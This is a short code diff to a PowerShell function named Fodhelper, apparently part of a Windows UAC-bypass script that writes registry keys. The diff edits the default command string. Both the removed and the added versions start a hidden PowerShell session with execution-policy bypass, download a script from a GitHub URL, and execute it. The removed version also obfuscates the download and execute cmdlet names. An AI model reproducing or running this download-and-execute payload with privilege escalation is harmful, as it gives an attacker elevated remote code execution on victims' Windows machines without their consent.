@@ -1,7 +1,8 @@
 function Fodhelper(){ 
  Param (
            
-        [String]$program = "C:\Windows\System32\conhost.exe --headless powershell -exec Bypass -c `"`$l='http'+'s://raw.githubusercontent.com/jabdotNet/tests/main/x1.ps3';(i''wR -UseBasicParsing `$l).content|i''E''x`" 
+        [String]$program = "start /b cmd /c powershell -WindowStyle hidden -exec Bypass -c `"iex(iwr -useb 'https://raw.githubusercontent.com/jabdotNet/tests/main/x1.ps3')`""
+        
        )
 　
     #Create Registry Structure
